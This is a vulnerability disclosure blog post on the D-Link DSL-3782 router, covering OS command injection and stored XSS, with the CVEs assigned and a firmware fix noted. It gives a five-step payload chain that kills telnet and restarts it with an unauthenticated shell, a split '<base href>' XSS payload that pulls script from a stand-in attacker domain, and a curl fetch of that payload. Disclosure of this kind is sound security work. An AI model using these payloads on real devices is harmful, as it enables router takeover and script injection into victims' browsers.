---
title:  "D-Link DSL-3782 SecAdvisory: OS Command Injection and Stored XSS"
date:   2019-01-24 15:04:23
categories: [Web]
tags: [Router,IoT,WebPenTest,CVE-2018–17990,CVE-2018-17989]
---
_In this article I'm going to release the technical details of two vulnerabilities that I found by analyzing D-Link DIR-3782 router web interface. In particular I've found OS Command Injection and Stored Cross Site Scripting vulnerabilities._

## The Device: D-Link DSL-3782
The VDSL/ADSL Wi-Fi Modem Router AC1200 Dual-Band DSL-3782 is a router device suitable for homes or small offices with ADSL line.
Once powered on, the device provides a simple web interface with many different menu and settings, such as Firewall, Application, Port Forwarding and Access Control List. If you want more information about this product, a full description (in Italian) can be found [here][descDlink] 

At the time of writing, this device is marked as `in production` by D-Link and this means that its software is actively maintained and supported by the vendor. The firmware version afflicted by these vulnerabilities is the `1.01` and the `1.03` version addressed the flaws. 

## OS Command Injection
OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and it usually fully compromises the application and all its data.

### Discovery
Hunting for some injection points, I noticed a particular menu inside the router web server that allows a user to define a custom Access Control List (ACL).

![ACL Menu](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACL.png)

I was curious to understand how it had been implemented so I decided to access the router console and search for some sort of "acl-related" file. Poking around inside the configuration directory `etc`, I found a script called `acl.sh` that seems to be promising. 

![acl.sh](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh.png)

The next move was to determinate if this file was, in some way, related or linked to the ACL menu of the web interface. Below is provided a usage example of this functionality through some screenshots that show what a user can see from the web interface and also what happens inside the device configuration file `/etc/acl.sh` when a new ACL is activated.

![ACL Menu2](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh2.png)

![acl.sh2](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACL2.png)

Great!! Now we know for sure that multiple user inputs such as `Source IP Address` or `Application`, that are sent as the form values `ScrIPaddrBeginTXT` and `ApplicationSEL`, are taken by the application and used as parameters for many different iptables commands so a change in web interface implies a direct change inside `acl.sh` script. Moreover the script is immediately executed by the device when a new ACL is created.

Let's start to check if a correct validation is applied to user's input. A variety of shell metacharacters can be used to perform OS command injection attacks, but the most common in a unix-like environment is the `;`. Indeed the first payload that I tried to inject inside `ScrIPaddrEndTXT` parameter was the harmless `;test` that aims to end the previous iptables command syntax with a `;` and execute the fake command `test`. 

![acl.sh3](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_request1.png)

Checking the `acl.sh` script it is possible to see my untouched payload, this is the prove that I can break the script syntax and execute arbitrary commands!!

![acl.sh3](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh3.png)

### Exploitation
It's time to exploit this injection to take full control over the device! My idea was to put a backdoor on the device and then use it to access the whole system. I thought Telnet was a good option since the router already has this software on board and it would have provided a fast and reliable access to the filesystem.

Since the router by default runs a `utelnetd` service `358 admin 180 S utelnetd -l /bin/login -d` where a user, in order to access the system, has to provide valid credentials, it is necessary to stop this service and start a new one without any authentication. Something like this: `utelnetd -l /bin/sh -d`

However there was one big limitation with this injection point: the payload length. Suddenly the application cuts the user input allowing to inject only 15 characters (13 if you consider that the first and the last characters must be a semicolon `;`) so it is necessary to find a workaround to bypass this limitation. 

 After many failed attempts, I came out with the solution to my problem that could be defined a multi-stage exploit. In particular I've noticed that it was possible to inject commands multiple times inside the acl.sh script and all of them were executed, so the problem was to find a correct 13-chars-length command sequence that would have allowed to stop and then restart telnet service. I think there are different ways to do this, mine is the following:

```python
Payload 1: 'ps|grep tel>a'     # identify telnet pid grepping ps output and store it in file a 
Payload 2: 'grep -v gr a>b'    # remove unwanted line
Payload 3: 'kill $(cat b)'     # kill utelnetd
Payload 4: 'cp /bin/sh .'      # copy sh executable in root folder
Payload 5: 'utelnetd -dl sh'   # restart utelnetd binded on sh
``` 
 
The final exploit is a simple python script that, for each payload, obtains a new `sessionKey` (needed in order to perform any POST request to the router web application) and crafts the correct request based on exploit sequence. You can find it in my [github repo][github repo].


<div class="video-container"><iframe width="560" height="315" src="https://www.youtube.com/embed/uu6rZuEOzh0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
<style>
	.video-container {
	position:relative;
	padding-bottom:56.25%;
	padding-top:30px;
	height:0;
	overflow:hidden;
}

.video-container iframe, .video-container object, .video-container embed {
	position:absolute;
	top:0;
	left:0;
	width:100%;
	height:100%;
}	
</style>


### Final notes
In order to exploit this vulnerability an attacker needs to be logged inside the web application. However, in a real world scenario, it is possible to chain [CVE-2018-8898][CVE-2018-8898] (authentication bypass vulnerability) to attempt to execute this exploit as an unauthenticated user. Please note that my exploit already takes advantage of this vulnerability as shown in the video. 

<br>

## Stored Cross-Site Scripting
Cross-Site Scripting vulnerability, or XSS, arises when a malicious user input is echoed back inside a web application response without it has been properly sanitized. In particular, Stored Cross-Site Scripting occurs when data submitted by one user is stored in the application (typically in a back-end database) and then it is displayed to other users without being filtered or sanitized appropriately.

### Discovery
The first thing that I do when I'm looking for XSS is to try to inject simple HTML-related metacharacters like the `< >` and see how the application reacts. If the web application reflects or stores my payload and then includes it inside a response without any output encoding, it is a good indicator of an injection issue presence. The next step is to try a more complicated but harmless payload to achieve an html injection. For example, as you can see from the following screenshot, the html tag `<s>` was echoed back inside the response page and the html syntax results to be altered.
 
![acl.sh3](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss3.png)



### Exploitation
It's time to escalate this bug from an HTML to a JavaScript injection but, as aforementioned in the OS command injection, it is not possible to use a normal payload such as `<script>alert(1)</script>` because the application cuts our input. 

We definitely have to find a really short xss payload but, thanks to [@brutelogic][brute] who wrote a great blog post titled [The shortest xss payload][xss], I've find out the `<base href=//att.com>` HTML tag that specifies the base URL/target for all relative URLs in a document. Basically, if an attacker managed to inject this tag inside a page, during the DOM construction all the external resources specified with a local path (such as `<img href="/image/cat.png">`) would be resolved with the new domain, so the browser instead of requesting a `current_domain/resource`, it will request a `new_base/resource`. Exploiting this behaviour the victim browser will automatically request some resources (the ones defined with a relative path) from the attacker's domain. 
If you want to explore in depth the functionality of the `base` tag, I've written a small demonstration page [here][base_example].

Let's start to make it works! The first step to exploit this vulnerability is to find a short domain that fits the payload characters limitations. In particular,
in order to exploit this vulnerability in the wild, an attacker has to register a public domain composed by two short words with a dash between them: `<short string>-<short string>.<short top-level domain>`.
As example, I used the domain `a-tt.com` as the attacker's domain and I managed to simulate its existence adding a line to my `hosts` configuration file. 
The command showed below will force your pc to resolve the attacker's domain `a-tt.com` with the 127.0.0.1 IP address. 

```bash
127.0.0.1	a-tt.com
```

The second step needed is to create an `asp` file called `header.asp` with the real exploit payload, this code will be executed by the victim's browser so you can add whatever you want. Reading the following steps the reason why the file needs to have this particular name and extension is clear. Since this is just a test, I created the following simple alert script that will prove the presence of the vulnerability by prompting a JavaScript popup.

```html
<html>
    <h1>Attacker's Site</h1>
    <script>alert('XSS in domain: '+document.domain)</script>
</html>
```

The third step needed is to start a local web server (for example using python) in order to serve our resource.
```
$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Now it is possible to test our configuration:
```
$ curl http://a-tt.com/header.asp
<html>
<h1>Attacker's Site</h1>
<script>alert('XSS in domain: '+document.domain)</script>
</html>
```

We are now ready to store the XSS payload inside the device web application tampering the following request.

![](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss4.png)

As you can see from the image, the payload was divided in two parts that have been injected respectively: `<base href=//a` in the `SrcIPaddrBeginTXT` parameter and `tt.com>` in the `SrcIPaddrEndTXT` parameter.

Once the DOM tree will be created by the browser, the html code, with the injected payload, will be the following: 

![](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss2.png)

As effect of this modification in the `base`, the browser will request all the resources included in the page to the attacker's domain `a-tt.com` instead of to the real domain and, in particular, the first request that will perform hits the resource `/header.asp` (that's why we created this resource and hosted it on our server). 
The final result is shown in the picture below, where our payload has been downloaded and executed by the victim's browser!

![](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss1.png)
<br>

## Conclusion
These vulnerabilities were submitted to the vendor that acknowledged their presence. Moreover, the following CVEs were assigned by Mitre:
- CVE-2018-17989 [Cross Site Scripting][CVE-2018-17989]
- CVE-2018–17990 [OS Command Injection][CVE-2018-17990]

## References
- https://blog.mindedsecurity.com/2018/10/pentesting-iot-devices-part-2-dynamic.html
- https://github.com/firmadyne/firmadyne
 
[descDlink]:        https://eu.dlink.com/it/it/products/dsl-3782-wireless-ac1200-dual-band-vdsl-adsl-modem-router
[CVE-2018-8898]:    https://www.exploit-db.com/exploits/44657      
[github repo]:      https://github.com/c0mix/D-Link-DSL-3782-SecAdvisory
[xss]:              https://brutelogic.com.br/blog/shortest-reflected-xss-possible/
[base_example]:     https://www.w3schools.com/code/tryit.asp?filename=FZK6RNOO0OJX
[brute]:            https://twitter.com/brutelogic
[CVE-2018-17989]:   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17989
[CVE-2018-17990]:   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17990
